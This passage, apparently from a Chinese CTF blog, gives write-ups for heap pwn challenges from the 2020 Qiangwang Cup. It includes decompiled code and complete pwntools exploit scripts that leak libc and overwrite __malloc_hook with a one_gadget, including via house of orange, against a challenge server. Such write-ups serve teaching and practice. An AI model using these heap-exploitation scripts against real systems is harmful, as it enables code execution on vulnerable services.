"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, note)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Input your note: "</span>, note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span><span class="params">(name, motto, age)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line">    regit(name, motto, age)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"7"</span>)</span><br><span class="line"></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line">regit(<span class="string">"AAA"</span>, <span class="string">"AAA"</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x58</span> - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap overflow</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">reset(<span class="string">"A"</span> * <span class="number">0x18</span>, <span class="string">"B"</span> * <span class="number">0x18</span>, <span class="number">0x91</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># _malloc_hook</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x88</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">'\x00'</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h1 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a>Just_a_Galgame</h1><h1 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h1><ol>
<li><p>由于<code>add</code>功能是<code>malloc(0x68)</code>，而<code>edit</code>是功能可以覆盖<code>read(0, (void *)(chunk_array[v4] + 0x60), 0x10uLL);</code>显然存在一个heap overflow可以覆盖size。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Emmm...Alright. Thank you."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  --v6;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Wow! Thanks~\n"</span>);</span><br><span class="line">  chunk_array[<span class="number">6</span> - v6] = (__int64)<span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[ You've hold some place in her heart! ]"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> || v6 &gt; <span class="number">6</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Emmm...Sorry I should go home now. Maybe the next time.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Okay~ Let's choose a movie!\n"</span>);</span><br><span class="line">  --v7;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx &gt;&gt; "</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( chunk_array[atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf)] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"movie name &gt;&gt; "</span>);</span><br><span class="line">    v4 = atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(chunk_array[v4] + <span class="number">0x60</span>), <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\nHotaru: What a good movie! I like it~\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[ You've gained a lot favor of her! ]"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[ The movie is not exist. ]"</span>);</span><br><span class="line">    ++v7;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意到程序没有<code>delete</code>功能，那么就利用heap overflow覆盖top chunk的size，在利用house of orange，即利用<code>malloc(0x1000)</code>把old top chunk放入unsorted bin中：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">0</span> || v6 &gt; <span class="number">6</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nHotaru: Sorry, I think it's better for us to be friends.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  --v8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You are the apple of my eyes too!"</span>);</span><br><span class="line">  big_chunk = (__int64)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  ++v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后从unsorted bin分配chunk，再利用<code>show</code>leak出libc地址；同时<code>edit</code>没有对下标进行检查，而且<code>Leave</code>功能读入的字符串的位置就在<code>bss</code>上 chunk array 的后面：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404060</span> <span class="comment">; __int64 chunk_array[7]</span></span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404060</span> chunk_array     <span class="built_in">dq</span> ?                    <span class="comment">; DATA XREF: main+C3↑w</span></span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404060</span>                                         <span class="comment">; main+146↑r ...</span></span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404068</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404070</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404078</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404080</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404088</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404090</span>                 <span class="built_in">dq</span> ?</span><br><span class="line"><span class="symbol">.bss:</span><span class="number">0000000000404098</span> big_chunk       <span class="built_in">dq</span> ?                    <span class="comment">; DATA XREF: main+1F9↑w</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A0 msg             <span class="built_in">db</span>    ? <span class="comment">;               ; DATA XREF: main+270↑o</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A0                                         <span class="comment">; main+284↑o</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A1                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A2                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A3                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A4                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A5                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A6                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A7                 <span class="built_in">db</span>    ? <span class="comment">;</span></span><br><span class="line"><span class="symbol">.bss:</span>00000000004040A7 _bss            ends</span><br></pre></td></tr></table></figure>

<p> 所以利用<code>Leave</code>在<code>msg</code>处写入<code>__malloc_hook - 0x60</code>，然后利用<code>edit</code>打<code>_malloc_hook</code>为 onegadget 即可。</p>
</li>
<li><p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">52114</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx &gt;&gt; "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"movie name &gt;&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bigchunk</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(str(idx) + <span class="string">": "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span><span class="params">(message)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'5'</span>)</span><br><span class="line">    p.sendafter(<span class="string">"\nHotaru: Won't you stay with me for a while? QAQ\n"</span>, message)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x10a45c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># house of orange</span></span><br><span class="line">add() <span class="comment"># chunk 0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">8</span> + p64(<span class="number">0xD41</span>))</span><br><span class="line">bigchunk() </span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">add() <span class="comment"># chunk 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x660</span> - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># __malloc_hook</span></span><br><span class="line">msg(p64(__malloc_hook - <span class="number">0x60</span>))</span><br><span class="line">edit(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Nop</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://n0nop.com/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/">https://n0nop.com/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/rev/">rev</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2020/08/21/CISCN-2020-%E5%88%9D%E8%B5%9B-pwn/"><span>CISCN 2020 初赛 pwn</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == 'true';
var verify = 'false' == 'true';
var record_ip = 'false' == 'true';
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  recordIP:record_ip,
  appId:'r5Gkikl9GU9Oux3XiRu5Xtel-MdYXbMMI',
  appKey:'zSDYDqmNTxhb5QxupwDuYOxQ',
  placeholder:'......',
  avatar:'',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://n0nop.com/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2020 By Nop</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>